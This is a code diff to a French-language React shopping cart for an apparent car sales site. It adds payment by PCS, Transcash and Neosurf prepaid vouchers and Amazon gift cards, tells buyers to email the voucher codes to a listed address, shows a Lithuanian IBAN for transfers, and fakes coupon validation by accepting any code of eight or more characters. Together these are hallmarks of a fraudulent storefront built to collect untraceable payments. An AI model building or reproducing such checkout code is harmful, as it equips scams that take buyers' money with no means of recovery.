@@ -4,7 +4,7 @@ import { Navbar } from "@/components/Navbar";
 import { Footer } from "@/components/Footer";
 import { Button } from "@/components/ui/button";
 import { Link, useNavigate } from "react-router-dom";
-import { ArrowLeft, Trash2, ShoppingCart, Info, Check, CreditCard, Wallet, Euro } from "lucide-react";
+import { ArrowLeft, Trash2, ShoppingCart, Info, Check, CreditCard, Wallet, Euro, Gift, AlertCircle } from "lucide-react";
 import { Car } from "@/types/car";
 import { formatEuro } from "@/lib/utils";
 import { toast } from "sonner";
@@ -21,6 +21,7 @@ import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group";
 import { Label } from "@/components/ui/label";
 import { Input } from "@/components/ui/input";
 import { Card, CardContent } from "@/components/ui/card";
+import { Textarea } from "@/components/ui/textarea";
 
 const Cart = () => {
   const [items, setItems] = useState<Car[]>([]);
@@ -28,6 +29,9 @@ const Cart = () => {
   const [checkoutDialogOpen, setCheckoutDialogOpen] = useState(false);
   const [paymentMethod, setPaymentMethod] = useState("bank-transfer");
   const [couponCode, setCouponCode] = useState("");
+  const [couponType, setCouponType] = useState("pcs");
+  const [couponApplied, setCouponApplied] = useState(false);
+  const [couponError, setCouponError] = useState("");
   const navigate = useNavigate();
 
   const loadCartItems = () => {
@@ -88,10 +92,36 @@ const Cart = () => {
   const getPaymentMethodLabel = (method: string) => {
     switch(method) {
       case "credit-card": return "Carte bancaire";
-      case "pcs-voucher": return "Coupons PCS";
+      case "pcs": return "Coupons PCS";
+      case "transcash": return "Coupons Transcash";
+      case "neosurf": return "Coupons Neosurf";
+      case "amazon": return "Cartes cadeau Amazon";
       case "bank-transfer": return "Virement bancaire";
       default: return "Virement bancaire";
     }
+  };
+
+  const handleApplyCoupon = () => {
+    if (!couponCode.trim()) {
+      setCouponError("Veuillez entrer un code coupon");
+      return;
+    }
+    
+    // Simulate coupon validation - in a real app would check against API
+    if (couponCode.length < 8) {
+      setCouponError("Code coupon invalide. Veuillez vérifier et réessayer.");
+      return;
+    }
+    
+    setCouponApplied(true);
+    setCouponError("");
+    toast.success("Code coupon appliqué avec succès !");
+  };
+
+  const resetCoupon = () => {
+    setCouponCode("");
+    setCouponApplied(false);
+    setCouponError("");
   };
 
   return (
@@ -244,10 +274,31 @@ const Cart = () => {
                       </Label>
                     </div>
                     <div className="flex items-center space-x-2 border rounded-md p-3 hover:bg-gray-100 cursor-pointer">
-                      <RadioGroupItem value="pcs-voucher" id="pcs-voucher" />
-                      <Label htmlFor="pcs-voucher" className="flex items-center cursor-pointer">
+                      <RadioGroupItem value="pcs" id="pcs" />
+                      <Label htmlFor="pcs" className="flex items-center cursor-pointer">
                         <Wallet className="h-5 w-5 mr-2 text-green-600" />
                         <span>Coupons PCS</span>
+                      </Label>
+                    </div>
+                    <div className="flex items-center space-x-2 border rounded-md p-3 hover:bg-gray-100 cursor-pointer">
+                      <RadioGroupItem value="transcash" id="transcash" />
+                      <Label htmlFor="transcash" className="flex items-center cursor-pointer">
+                        <Wallet className="h-5 w-5 mr-2 text-orange-600" />
+                        <span>Coupons Transcash</span>
+                      </Label>
+                    </div>
+                    <div className="flex items-center space-x-2 border rounded-md p-3 hover:bg-gray-100 cursor-pointer">
+                      <RadioGroupItem value="neosurf" id="neosurf" />
+                      <Label htmlFor="neosurf" className="flex items-center cursor-pointer">
+                        <Wallet className="h-5 w-5 mr-2 text-purple-600" />
+                        <span>Coupons Neosurf</span>
+                      </Label>
+                    </div>
+                    <div className="flex items-center space-x-2 border rounded-md p-3 hover:bg-gray-100 cursor-pointer">
+                      <RadioGroupItem value="amazon" id="amazon" />
+                      <Label htmlFor="amazon" className="flex items-center cursor-pointer">
+                        <Gift className="h-5 w-5 mr-2 text-yellow-600" />
+                        <span>Cartes cadeau Amazon</span>
                       </Label>
                     </div>
                     <div className="flex items-center space-x-2 border rounded-md p-3 hover:bg-gray-100 cursor-pointer">
@@ -261,17 +312,62 @@ const Cart = () => {
                 </div>
                 
                 <div className="mb-6">
-                  <div className="flex items-center space-x-2">
-                    <Input 
-                      type="text" 
-                      placeholder="Code promo" 
-                      value={couponCode}
-                      onChange={(e) => setCouponCode(e.target.value)}
-                    />
-                    <Button variant="outline" size="sm">
-                      Appliquer
-                    </Button>
-                  </div>
+                  <h3 className="font-medium mb-3">Code coupon</h3>
+                  {couponApplied ? (
+                    <div className="bg-green-50 border border-green-200 rounded-md p-3 mb-3">
+                      <div className="flex items-center justify-between">
+                        <div className="flex items-center">
+                          <Check className="h-5 w-5 text-green-500 mr-2" />
+                          <span>Code <span className="font-mono">{couponCode}</span> appliqué</span>
+                        </div>
+                        <Button variant="ghost" size="sm" onClick={resetCoupon}>
+                          Retirer
+                        </Button>
+                      </div>
+                    </div>
+                  ) : (
+                    <>
+                      <div className="space-y-3 mb-3">
+                        <div>
+                          <Label htmlFor="coupon-type">Type de coupon</Label>
+                          <select 
+                            id="coupon-type"
+                            className="flex h-10 w-full rounded-md border border-input bg-background px-3 py-2 text-sm ring-offset-background focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2"
+                            value={couponType}
+                            onChange={(e) => setCouponType(e.target.value)}
+                          >
+                            <option value="pcs">PCS</option>
+                            <option value="transcash">Transcash</option>
+                            <option value="neosurf">Neosurf</option>
+                            <option value="amazon">Amazon</option>
+                          </select>
+                        </div>
+                        <div>
+                          <Label htmlFor="coupon-code">Code coupon</Label>
+                          <Textarea 
+                            id="coupon-code"
+                            placeholder="Entrez votre code coupon ici"
+                            value={couponCode}
+                            onChange={(e) => setCouponCode(e.target.value)}
+                            rows={2}
+                            className={couponError ? "border-red-500" : ""}
+                          />
+                          {couponError && (
+                            <div className="text-red-500 text-sm mt-1 flex items-center">
+                              <AlertCircle className="h-4 w-4 mr-1" />
+                              {couponError}
+                            </div>
+                          )}
+                        </div>
+                      </div>
+                      <Button 
+                        onClick={handleApplyCoupon} 
+                        className="w-full"
+                      >
+                        Appliquer le code
+                      </Button>
+                    </>
+                  )}
                 </div>
                 
                 {/* Payment Information - Now directly visible instead of in accordion */}
@@ -383,7 +479,10 @@ const Cart = () => {
               <Card className="bg-gray-50">
                 <CardContent className="py-3 flex items-center">
                   {paymentMethod === "credit-card" && <CreditCard className="h-5 w-5 mr-2 text-blue-600" />}
-                  {paymentMethod === "pcs-voucher" && <Wallet className="h-5 w-5 mr-2 text-green-600" />}
+                  {paymentMethod === "pcs" && <Wallet className="h-5 w-5 mr-2 text-green-600" />}
+                  {paymentMethod === "transcash" && <Wallet className="h-5 w-5 mr-2 text-orange-600" />}
+                  {paymentMethod === "neosurf" && <Wallet className="h-5 w-5 mr-2 text-purple-600" />}
+                  {paymentMethod === "amazon" && <Gift className="h-5 w-5 mr-2 text-yellow-600" />}
                   {paymentMethod === "bank-transfer" && <Euro className="h-5 w-5 mr-2 text-amber-600" />}
                   <span>{getPaymentMethodLabel(paymentMethod)}</span>
                 </CardContent>
@@ -396,6 +495,24 @@ const Cart = () => {
                   <p>IBAN : LT453500010018283529</p>
                   <p>SWIFT/BIC : EVIULT2VXXX</p>
                   <p>Banque : Paysera LT, UAB</p>
+                </div>
+              )}
+              
+              {(paymentMethod === "pcs" || paymentMethod === "transcash" || paymentMethod === "neosurf" || paymentMethod === "amazon") && (
+                <div className="mt-2 bg-gray-100 p-3 rounded-md text-xs">
+                  <p className="font-medium mb-1">Instructions :</p>
+                  <p>Veuillez nous envoyer le code du coupon {getPaymentMethodLabel(paymentMethod)} par email après avoir confirmé votre commande.</p>
+                  <p className="mt-1">Email : info@serviceautoadi.it</p>
+                </div>
+              )}
+              
+              {couponApplied && (
+                <div className="mt-2 bg-green-50 p-3 rounded-md text-xs">
+                  <p className="font-medium mb-1 flex items-center">
+                    <Check className="h-3 w-3 mr-1 text-green-500" />
+                    Code coupon appliqué :
+                  </p>
+                  <p className="font-mono">{couponCode}</p>
                 </div>
               )}
             </div>
